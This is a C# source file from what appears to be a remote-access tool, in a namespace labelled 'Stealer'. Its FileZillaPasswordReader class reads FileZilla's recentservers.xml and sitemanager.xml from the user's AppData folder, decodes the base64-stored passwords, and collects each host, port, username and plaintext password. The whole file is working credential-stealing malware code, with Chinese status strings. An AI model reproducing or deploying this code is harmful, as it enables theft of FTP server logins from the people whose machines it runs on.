using FKRemoteDesktop.Message.MessageStructs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class FileZillaPasswordReader : IAccountReader
    {
        public string ApplicationName => "FileZilla 浏览器";
        public string KeyName => "Password";

        public string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        public string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> result = new List<RecoveredAccount>();
            try
            {
                if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
                {
                    result.Add(new RecoveredAccount
                    {
                        KeyName = KeyName,
                        Url = "未找到该浏览器进程",
                        Username = "N/A",
                        Password = "N/A",
                        Application = ApplicationName
                    });
                    return result;
                }
                if (File.Exists(RecentServerPath))
                {
                    XmlTextReader xmlTReader = new XmlTextReader(RecentServerPath);
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);
                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        string szHost = string.Empty;
                        string szUsername = string.Empty;
                        string szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        result.Add(new RecoveredAccount
                        {
                            KeyName = KeyName,
                            Url = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = ApplicationName
                        });
                    }
                }

                if (File.Exists(SiteManagerPath))
                {
                    XmlTextReader xmlTReader = new XmlTextReader(SiteManagerPath);
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);
                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        string szHost = string.Empty;
                        string szUsername = string.Empty;
                        string szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        result.Add(new RecoveredAccount
                        {
                            KeyName = KeyName,
                            Url = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = "FileZilla"
                        });
                    }
                }

                if (result.Count <= 0)
                {
                    result.Add(new RecoveredAccount
                    {
                        KeyName = KeyName,
                        Url = "N/A",
                        Username = "N/A",
                        Password = "N/A",
                        Application = ApplicationName
                    });
                }
                return result;
            }
            catch (Exception ex)
            {
                result.Add(new RecoveredAccount
                {
                    KeyName = KeyName,
                    Url = "访问出错: " + ex.Message,
                    Username = "N/A",
                    Password = "N/A",
                    Application = ApplicationName
                });
                return result;
            }
        }

        public string Base64Decode(string szInput)
        {
            try
            {
                byte[] base64ByteArray = Convert.FromBase64String(szInput);
                return Encoding.UTF8.GetString(base64ByteArray);
            }
            catch
            {
                return szInput;
            }
        }
    }
}